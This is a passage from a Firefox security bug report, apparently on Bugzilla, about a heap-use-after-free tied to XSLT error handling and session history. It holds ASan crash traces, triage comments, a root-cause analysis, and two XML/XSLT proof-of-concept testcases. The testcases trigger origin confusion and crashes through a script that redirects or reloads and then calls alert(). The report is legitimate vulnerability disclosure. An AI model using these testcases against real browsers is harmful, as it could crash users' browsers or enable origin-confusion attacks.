  0x0c3480039aa0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3480039ab0: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa
  0x0c3480039ac0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3480039ad0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==659463==ABORTING

```

2. `mozilla-esr91.revision.7de26aa38d0d1ac5339bc1794cd55582651d410a.firefox.linux64-asan-opt`:

```
==1134023==ERROR: AddressSanitizer: heap-use-after-free on address 0x61a000b3e05c at pc 0x7f0f89a32079 bp 0x7ffcdba155b0 sp 0x7ffcdba155a8
READ of size 2 at 0x61a000b3e05c thread T0
    #0 0x7f0f89a32078 in IsDiscarded /builds/worker/workspace/obj-build/dist/include/mozilla/dom/BrowsingContext.h:301:37
    #1 0x7f0f89a32078 in mozilla::dom::syncedcontext::Transaction<mozilla::dom::BrowsingContext>::Commit(mozilla::dom::BrowsingContext*) /builds/worker/workspace/obj-build/dist/include/mozilla/dom/SyncedContextInlines.h:92:7
    #2 0x7f0f89bcfe3a in SetHistoryEntryCount /builds/worker/workspace/obj-build/dist/include/mozilla/dom/BrowsingContext.h:227:3
    #3 0x7f0f89bcfe3a in operator() /builds/worker/checkouts/gecko/docshell/shistory/nsSHistory.cpp:1057:22
    #4 0x7f0f89bcfe3a in std::_Function_handler<void (mozilla::dom::BrowsingContext*), nsSHistory::PurgeHistory(int)::$_5>::_M_invoke(std::_Any_data const&, mozilla::dom::BrowsingContext*&&) /builds/worker/fetches/clang/bin/../lib/gcc/x86_64-unknown-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/std_function.h:316:2
    #5 0x7f0f89a3f82b in operator() /builds/worker/fetches/clang/bin/../lib/gcc/x86_64-unknown-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/std_function.h:706:14
    #6 0x7f0f89a3f82b in mozilla::dom::BrowsingContext::PreOrderWalkVoid(std::function<void (mozilla::dom::BrowsingContext*)> const&) /builds/worker/checkouts/gecko/docshell/base/BrowsingContext.cpp:1027:3
    #7 0x7f0f89bbabb7 in PreOrderWalk<(lambda at /builds/worker/checkouts/gecko/docshell/shistory/nsSHistory.cpp:1055:27)> /builds/worker/workspace/obj-build/dist/include/mozilla/dom/BrowsingContext.h:496:7
    #8 0x7f0f89bbabb7 in nsSHistory::PurgeHistory(int) /builds/worker/checkouts/gecko/docshell/shistory/nsSHistory.cpp:1055:14
    #9 0x7f0f7ff49e31 in NS_InvokeByIndex /builds/worker/checkouts/gecko/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:101
    #10 0x7f0f818e7c29 in Invoke /builds/worker/checkouts/gecko/js/xpconnect/src/XPCWrappedNative.cpp:1644:10
    #11 0x7f0f818e7c29 in Call /builds/worker/checkouts/gecko/js/xpconnect/src/XPCWrappedNative.cpp:1197:19
    #12 0x7f0f818e7c29 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/worker/checkouts/gecko/js/xpconnect/src/XPCWrappedNative.cpp:1143:23
    #13 0x7f0f818ec60c in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/checkouts/gecko/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:922:10
    #14 0x7f0f8a7aed11 in CallJSNative /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:426:13
    #15 0x7f0f8a7aed11 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:511:12
    #16 0x7f0f8b53815e in js::jit::DoCallFallback(JSContext*, js::jit::BaselineFrame*, js::jit::ICFallbackStub*, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) /builds/worker/checkouts/gecko/js/src/jit/BaselineIC.cpp:1595:10
    #17 0x2daaf004ad87  (<unknown module>)

0x61a000b3e05c is located 988 bytes inside of 1176-byte region [0x61a000b3dc80,0x61a000b3e118)
Thread T74 (WRRenderBackend) created by T26 here:
    #0 0x55cb5aa41acc in __interceptor_pthread_create /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cpp:205:3
    #1 0x7f0f8d3cbc4f in std::sys::unix::thread::Thread::new::hfcb67ed381ed8607 gkrust.3qd15s5o-cgu.0
    #2 0x7f0f8e970920 in wr_window_new /builds/worker/checkouts/gecko/gfx/webrender_bindings/src/bindings.rs:1665:36
    #3 0x7f0f826cfb0e in mozilla::wr::NewRenderer::Run(mozilla::wr::RenderThread&, mozilla::wr::WrWindowId) /builds/worker/checkouts/gecko/gfx/webrender_bindings/WebRenderAPI.cpp:157:10
    #4 0x7f0f8269ff4e in mozilla::wr::RenderThread::RunEvent(mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >) /builds/worker/checkouts/gecko/gfx/webrender_bindings/RenderThread.cpp:414:11 r
    #5 0x7f0f826b6636 in decltype(*(fp).*fp0(Get<0ul>(fp1).PassAsParameter(), Get<1ul>(fp1).PassAsParameter())) mozilla::detail::RunnableMethodArguments<mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >&&>::applyImpl<mozilla::wr::RenderThread, void (mozilla::wr::RenderThread::*)(mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >), StoreCopyPassByConstLRef<mozilla::wr::WrWindowId>, StoreCopyPassByRRef<mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> > >, 0ul, 1ul>(mozilla::wr::RenderThread*, void (mozilla::wr::RendaerThread::*)(mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >), mozilla::Tuple<StoreCopyPassByConstLRef<mozilla::wr::WrWindowId>, StoreCopyPassByRRef<mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> > > >&, std::integer_sequence<unsigned long, 0ul, 1ul>) /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:1148:12
    #6 0x7f0f826b639b in apply<mozilla::wr::RenderThread, void (mozilla::wr::RenderThread::*)(mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent>)> /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:1154:12
    #7 0x7f0f826b639b in mozilla::detail::RunnableMethodImpl<mozilla::wr::RenderThread*, void (mozilla::wr::RenderThread::*)(mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >), true, (mozilla::RunnableKind)0, mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >&&>::Run() /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:1201:13
    #8 0x7f0f80ecf649 in MessageLoop::RunTask(already_AddRefed<nsIRunnable>) /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:454:11
    #9 0x7f0f80ed02de in MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask&&) /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:463:5
    #10 0x7f0f80ed0b6b in MessageLoop::DoWork() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:538:13
    #11 0x7f0f80ed1e26 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_pump_default.cc:35:31
    #12 0x7f0f80ecf241 in RunInternal /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:331:10
    #13 0x7f0f80ecf241 in RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:324:3
    #14 0x7f0f80ecf241 in MessageLoop::Run() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:306:3
    #15 0x7f0f80eed8ea in base::Thread::ThreadMain() /builds/worker/checkouts/gecko/ipc/chromium/src/base/thread.cc:187:16
    #16 0x7f0f80ee151c in ThreadFunc(void*) /builds/worker/checkouts/gecko/ipc/chromium/src/base/platform_thread_posix.cc:40:13
    #17 0x7f0f9e0145c1 in start_thread pthread_create.c

Thread T26 created by T0 here:
    #0 0x55cb5aa41acc in __interceptor_pthread_create /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cpp:205:3
    #1 0x7f0f80edb37c in CreateThread /builds/worker/checkouts/gecko/ipc/chromium/src/base/platform_thread_posix.cc:123:14
    #2 0x7f0f80edb37c in PlatformThread::Create(unsigned long, PlatformThread::Delegate*, unsigned long*) /builds/worker/checkouts/gecko/ipc/chromium/src/base/platform_thread_posix.cc:134:10
    #3 0x7f0f80eed11d in base::Thread::StartWithOptions(base::Thread::Options const&) /builds/worker/checkouts/gecko/ipc/chromium/src/base/thread.cc:93:8
    #4 0x7f0f8269ae4a in mozilla::wr::RenderThread::Start() /builds/worker/checkouts/gecko/gfx/webrender_bindings/RenderThread.cpp:91:16
    #5 0x7f0f82402089 in gfxPlatform::InitLayersIPC() /builds/worker/checkouts/gecko/gfx/thebes/gfxPlatform.cpp:1331:7
    #6 0x7f0f823fd943 in gfxPlatform::Init() /builds/worker/checkouts/gecko/gfx/thebes/gfxPlatform.cpp:971:3
    #7 0x7f0f823fc35b in gfxPlatform::GetPlatform() /builds/worker/checkouts/gecko/gfx/thebes/gfxPlatform.cpp:481:5
    #8 0x7f0f86cf2a6c in mozilla::widget::GfxInfoBase::GetContentBackend(nsTSubstring<char16_t>&) /builds/worker/checkouts/gecko/widget/GfxInfoBase.cpp:1851:25
    #9 0x7f0f7ff49e31 in NS_InvokeByIndex /builds/worker/checkouts/gecko/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:101
    #10 0x7f0f818e7c29 in Invoke /builds/worker/checkouts/gecko/js/xpconnect/src/XPCWrappedNative.cpp:1644:10
    #11 0x7f0f818e7c29 in Call /builds/worker/checkouts/gecko/js/xpconnect/src/XPCWrappedNative.cpp:1197:19
    #12 0x7f0f818e7c29 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/worker/checkouts/gecko/js/xpconnect/src/XPCWrappedNative.cpp:1143:23
    #13 0x7f0f818ed04e in GetAttribute /builds/worker/checkouts/gecko/js/xpconnect/src/xpcprivate.h:1461:12
    #14 0x7f0f818ed04e in XPC_WN_GetterSetter(JSContext*, unsigned int, JS::Value*) /builds/worker/checkouts/gecko/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:962:10
    #15 0x7f0f8a7aed11 in CallJSNative /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:426:13
    #16 0x7f0f8a7aed11 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:511:12
    #17 0x7f0f8a7b090b in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>, js::CallReason) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:588:8
    #18 0x7f0f8a7b1bbb in js::CallGetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:713:10
    #19 0x7f0f8acb0be2 in CallGetter /builds/worker/checkouts/gecko/js/src/vm/NativeObject.cpp:2040:12
    #20 0x7f0f8acb0be2 in GetExistingProperty<js::CanGC> /builds/worker/checkouts/gecko/js/src/vm/NativeObject.cpp:2068:12
    #21 0x7f0f8acb0be2 in NativeGetPropertyInline<js::CanGC> /builds/worker/checkouts/gecko/js/src/vm/NativeObject.cpp:2214:14
    #22 0x7f0f8acb0be2 in js::NativeGetProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::Value>, JS::Handle<JS::PropertyKey>, JS::MutableHandle<JS::Value>) /builds/worker/checkouts/gecko/js/src/vm/NativeObject.cpp:2245:10
    #23 0x7f0f8a79d6fe in GetProperty /builds/worker/checkouts/gecko/js/src/vm/ObjectOperations-inl.h:116:10
    #24 0x7f0f8a79d6fe in GetObjectElementOperation /builds/worker/checkouts/gecko/js/src/vm/Interpreter-inl.h:419:10
    #25 0x7f0f8a79d6fe in GetElementOperationWithStackIndex /builds/worker/checkouts/gecko/js/src/vm/Interpreter-inl.h:505:10
    #26 0x7f0f8a79d6fe in Interpret(JSContext*, js::RunState&) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:3040:12
    #27 0x7f0f8a780547 in js::RunScript(JSContext*, js::RunState&) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:395:13
    #28 0x7f0f8a7aedf5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:543:13
    #29 0x7f0f8a7b090b in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>, js::CallReason) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:588:8
    #30 0x7f0f8a8e491c in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/checkouts/gecko/js/src/jsapi.cpp:2722:10
    #31 0x7f0f818d9359 in nsXPCWrappedJS::CallMethod(unsigned short, nsXPTMethodInfo const*, nsXPTCMiniVariant*) /builds/worker/checkouts/gecko/js/xpconnect/src/XPCWrappedJSClass.cpp:971:17
    #32 0x7f0f7ff4b7c2 in PrepareAndDispatch /builds/worker/checkouts/gecko/xpcom/reflect/xptcall/md/unix/xptcstubs_x86_64_linux.cpp:115:37
    #33 0x7f0f7ff4a54a in SharedStub xptcstubs_x86_64_linux.cpp
    #34 0x7f0f7feb6210 in NS_CreateServicesFromCategory(char const*, nsISupports*, char const*, char16_t const*) /builds/worker/checkouts/gecko/xpcom/components/nsCategoryManager.cpp:687:19
    #35 0x7f0f8a591fc9 in nsXREDirProvider::DoStartup() /builds/worker/checkouts/gecko/toolkit/xre/nsXREDirProvider.cpp:982:11
    #36 0x7f0f8a56dab8 in XREMain::XRE_mainRun() /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:4998:18
    #37 0x7f0f8a570afc in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:5434:8
    #38 0x7f0f8a5718b3 in XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/checkouts/gecko/toolkit/xre/nsAppRunner.cpp:5493:21
    #39 0x55cb5aa8bd3f in do_main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:225:22
    #40 0x55cb5aa8bd3f in main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:378:16
    #41 0x7f0f9dfb430f in __libc_start_call_main libc-start.c

Thread T72 (WRSceneBuilder#) created by T26 here:
    #0 0x55cb5aa41acc in __interceptor_pthread_create /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cpp:205:3
    #1 0x7f0f8d3cbc4f in std::sys::unix::thread::Thread::new::hfcb67ed381ed8607 gkrust.3qd15s5o-cgu.0
    #2 0x7f0f8e970920 in wr_window_new /builds/worker/checkouts/gecko/gfx/webrender_bindings/src/bindings.rs:1665:36
    #3 0x7f0f826cfb0e in mozilla::wr::NewRenderer::Run(mozilla::wr::RenderThread&, mozilla::wr::WrWindowId) /builds/worker/checkouts/gecko/gfx/webrender_bindings/WebRenderAPI.cpp:157:10
    #4 0x7f0f8269ff4e in mozilla::wr::RenderThread::RunEvent(mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >) /builds/worker/checkouts/gecko/gfx/webrender_bindings/RenderThread.cpp:414:11
    #5 0x7f0f826b6636 in decltype(*(fp).*fp0(Get<0ul>(fp1).PassAsParameter(), Get<1ul>(fp1).PassAsParameter())) mozilla::detail::RunnableMethodArguments<mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >&&>::applyImpl<mozilla::wr::RenderThread, void (mozilla::wr::RenderThread::*)(mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >), StoreCopyPassByConstLRef<mozilla::wr::WrWindowId>, StoreCopyPassByRRef<mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> > >, 0ul, 1ul>(mozilla::wr::RenderThread*, void (mozilla::wr::RenderThread::*)(mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >), mozilla::Tuple<StoreCopyPassByConstLRef<mozilla::wr::WrWindowId>, StoreCopyPassByRRef<mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> > > >&, std::integer_sequence<unsigned long, 0ul, 1ul>) /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:1148:12
    #6 0x7f0f826b639b in apply<mozilla::wr::RenderThread, void (mozilla::wr::RenderThread::*)(mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent>)> /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:1154:12
    #7 0x7f0f826b639b in mozilla::detail::RunnableMethodImpl<mozilla::wr::RenderThread*, void (mozilla::wr::RenderThread::*)(mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >), true, (mozilla::RunnableKind)0, mozilla::wr::WrWindowId, mozilla::UniquePtr<mozilla::wr::RendererEvent, mozilla::DefaultDelete<mozilla::wr::RendererEvent> >&&>::Run() /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:1201:13
    #8 0x7f0f80ecf649 in MessageLoop::RunTask(already_AddRefed<nsIRunnable>) /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:454:11
    #9 0x7f0f80ed02de in MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask&&) /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:463:5
    #10 0x7f0f80ed0b6b in MessageLoop::DoWork() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:538:13
    #11 0x7f0f80ed1e26 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_pump_default.cc:35:31
    #12 0x7f0f80ecf241 in RunInternal /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:331:10
    #13 0x7f0f80ecf241 in RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:324:3
    #14 0x7f0f80ecf241 in MessageLoop::Run() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:306:3
    #15 0x7f0f80eed8ea in base::Thread::ThreadMain() /builds/worker/checkouts/gecko/ipc/chromium/src/base/thread.cc:187:16
    #16 0x7f0f80ee151c in ThreadFunc(void*) /builds/worker/checkouts/gecko/ipc/chromium/src/base/platform_thread_posix.cc:40:13
    #17 0x7f0f9e0145c1 in start_thread pthread_create.c

SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/obj-build/dist/include/mozilla/dom/BrowsingContext.h:301:37 in IsDiscarded
Shadow bytes around the buggy address:
  0x0c348015fbb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c348015fbc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c348015fbd0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c348015fbe0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c348015fbf0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c348015fc00: fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd fd
  0x0c348015fc10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c348015fc20: fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c348015fc30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c348015fc40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c348015fc50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==1134023==ABORTING

```

I don't have a reliable testcase available yet, but I'll keep investigating and follow up.

Flags: sec-bounty?

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a23178_406194)• 3 years ago |

Group: core-security → dom-core-securityKeywords: [csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---)

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1765951#c1)• 3 years ago |
|  | |

Looks like nsSHistory::mRootBC isn't getting cleared in some circumstance. The free stack doesn't look related to the use stack, so I don't think it is an issue of needing to root the BC from the use stack.

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1765951#c2)• 3 years ago |
|  | |

XSLT and nsSHistory? Sounds like something Peter could look at. :)

Flags: needinfo?(peterv)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a478239_1689)• 3 years ago |

Keywords: [testcase-wanted](/buglist.cgi?keywords=testcase-wanted&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1765951#c3)• 3 years ago |
|  | |

Setting a needinfo? on the reporter to signal we need more info to make any progress

Even an "unreliable testcase" would be useful: we can run it multiple times and if it does reproduce, preserve that run in Pernosco.

Flags: needinfo?(armin)

|  | [Armin Ebert [:arminius]](/user_profile?user_id=526160)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1765951#c4)• 3 years ago |
| obsolete | |

| Comment hidden (obsolete) |  |
| --- | --- |

Sorry I didn't find the time earlier! First, here's some more info on the root cause.

AIUI, there are two different places where an XML error document can be generated. The second one seems to be the problem here. Very roughly:

1. When the loading XML doc causes a parsing error, it's handled in `nsXMLContentSink::ReportError()`. To display the error, the current node tree is just swapped out for a `<parsererror>` DOM. (i.e. the DOM changes, but no new document is created)
2. When an error occurs while processing an XSLT sheet, it's handled in `txMozillaXSLTProcessor::reportError()`. Here, a new XML document is created for the error report. It replaces the current one and uses a new inner window.

Trace to illustrate how an XSLT error leads to a new `nsGlobalWindowInner`:

```
#0  nsGlobalWindowInner::nsGlobalWindowInner(nsGlobalWindowOuter*, mozilla::dom::WindowGlobalChild*) (this=0x7fc418bd7800, aOuterWindow=0x7fc447ba6bc0, aActor=0x0) at /builds/worker/checkouts/gecko/dom/base/nsGlobalWindowInner.cpp:938
#1  0x00007fc4349f76f3 in nsGlobalWindowInner::Create(nsGlobalWindowOuter*, bool, mozilla::dom::WindowGlobalChild*) (aOuterWindow=0x7fc447ba6bc0, aIsChrome=false, aActor=0x0) at /builds/worker/checkouts/gecko/dom/base/nsGlobalWindowInner.cpp:7805
#2  0x00007fc434a18542 in nsGlobalWindowOuter::SetNewDocument(mozilla::dom::Document*, nsISupports*, bool, mozilla::dom::WindowGlobalChild*) (this=0x7fc447ba6bc0, aDocument=0x7fc421842200, aState=0x0, aForceReuseInnerWindow=false, aActor=0x0) at /builds/worker/checkouts/gecko/dom/base/nsGlobalWindowOuter.cpp:2217
#3  0x00007fc4393eedeb in nsDocumentViewer::SetDocumentInternal(mozilla::dom::Document*, bool) (this=0x7fc41be88040, aDocument=0x7fc421842200, aForceReuseInnerWindow=false) at /builds/worker/checkouts/gecko/layout/base/nsDocumentViewer.cpp:1883
#4  0x00007fc4393ee9ae in nsDocumentViewer::SetDocument(mozilla::dom::Document*) (this=0x7fc41be88040, aDocument=0x7fc421842200) at /builds/worker/checkouts/gecko/layout/base/nsDocumentViewer.cpp:1834
#5  0x00007fc4388beb8f in nsXMLContentSink::OnTransformDone(nsresult, mozilla::dom::Document*) (this=0x7fc4192ef000, aResult=nsresult::NS_ERROR_FAILURE, aResultDocument=0x7fc421842200) at /builds/worker/checkouts/gecko/dom/xml/nsXMLContentSink.cpp:354
#6  0x00007fc43892d5fd in txMozillaXSLTProcessor::notifyError() (this=0x7fc41f44d1c0) at /builds/worker/checkouts/gecko/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:1028
#7  0x00007fc43891fa5a in txMozillaXSLTProcessor::reportError(nsresult, char16_t const*, char16_t const*) (this=0x7fc41f44d1c0, aResult=nsresult::NS_ERROR_FAILURE, aErrorText=0x7fc41f4b2408 u"XML Parsing Error: syntax error\nLocation: data:,x\nLine Number 1, Column 1:", aSourceText=0x7ffdecb80e04 u"x\n^") at /builds/worker/checkouts/gecko/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:958

```

Now since scripts may run during XSLT processing, there's a number of ways to end up with an unexpected context at the time the XSLT error is actually triggered and handled.

### Testcase 1

`http://localhost/testcase1.xml`:

```
<?xml-stylesheet type="application/xml" href="#sheet"?>
<stylesheet id="sheet" version="1.0" xmlns="http://www.w3.org/1999/XSL/Transform">
<template match="/">
    <script xmlns="http://www.w3.org/1999/xhtml">
        window.location = 'data:image/png,x'
        alert()
    </script>
</template>
</stylesheet>

```

**Expected:** Upon load, we should be redirected to `data:image/png,x`, an `ImageDocument` on a nullprincipal.

**Actual result:** We're redirected to `data:image/png,x`, but the document is an `XMLDocument` on the origin `localhost`.

What happens:

* The XSLT processor executes the contained sheet and inserts a `<script>` element as per the `<template>` rule.
* The script runs immediately (while the XSLT processor is still active) and initiates relocation to the `data:` image URI.
* The `alert()` modal suspends the XSLT processor, keeping it from completing normally.
* The location change cancels the XSLT processor which now wants to report this as an error by setting an XML error doc.
* The new XML error doc wrongly replaces the current image document.

Corresponding DOMLeak log:

```
[Child 2141987: Main Thread]: D/DOMLeakOuter DOMWINDOW 614000009e40 created outer=nullptr
[Child 2141987: Main Thread]: D/DOMLeakInner DOMWINDOW 61900014a580 created outer=614000009e40
[Child 2141987: Main Thread]: D/DOMLeakInner DOMWINDOW 61900014a580 SetNewDocument about:blank
[Child 2141987: Main Thread]: D/DOMLeakInner DOMWINDOW 61900014fa80 created outer=614000009e40
[Child 2141987: Main Thread]: D/DOMLeakInner DOMWINDOW 61900014fa80 SetNewDocument http://localhost/testcase1.xml
[Child 2141987: Main Thread]: D/DOMLeakInner DOMWINDOW 6190001b7680 created outer=614000009e40
[Child 2141987: Main Thread]: D/DOMLeakInner DOMWINDOW 6190001b7680 SetNewDocument data:image/png,x
[Child 2141987: Main Thread]: D/DOMLeakInner DOMWINDOW 619000247780 created outer=614000009e40
[Child 2141987: Main Thread]: D/DOMLeakInner DOMWINDOW 619000247780 SetNewDocument http://localhost/testcase1.xml

```

This behavior can easily be leveraged to cause invalid states and crash, e.g.:

### Testcase 2

```
<?xml-stylesheet type="application/xml" href="#sheet"?>
<stylesheet id="sheet" version="1.0" xmlns="http://www.w3.org/1999/XSL/Transform">
<template match="/">
    <script xmlns="http://www.w3.org/1999/xhtml">
        location.reload()
        alert()
    </script>
</template>
</stylesheet>

```

This crashes e.g. when you relocate, insert an `<iframe>`, or un- and refocus the window. However, these are mostly null derefs:

```
==2191266==ERROR: AddressSanitizer: SEGV on unknown address 0x0000000002b0 (pc 0x7f40902b5aab bp 0x7fff6067ce30 sp 0x7fff6067ce30 T0)
==2191266==The signal is caused by a READ memory access.
==2191266==Hint: address points to the zero page.
    #0 0x7f40902b5aab in get /builds/worker/workspace/obj-build/dist/include/mozilla/RefPtr.h:286:27
    #1 0x7f40902b5aab in operator mozilla::dom::BrowsingContext * /builds/worker/workspace/obj-build/dist/include/mozilla/RefPtr.h:299:12
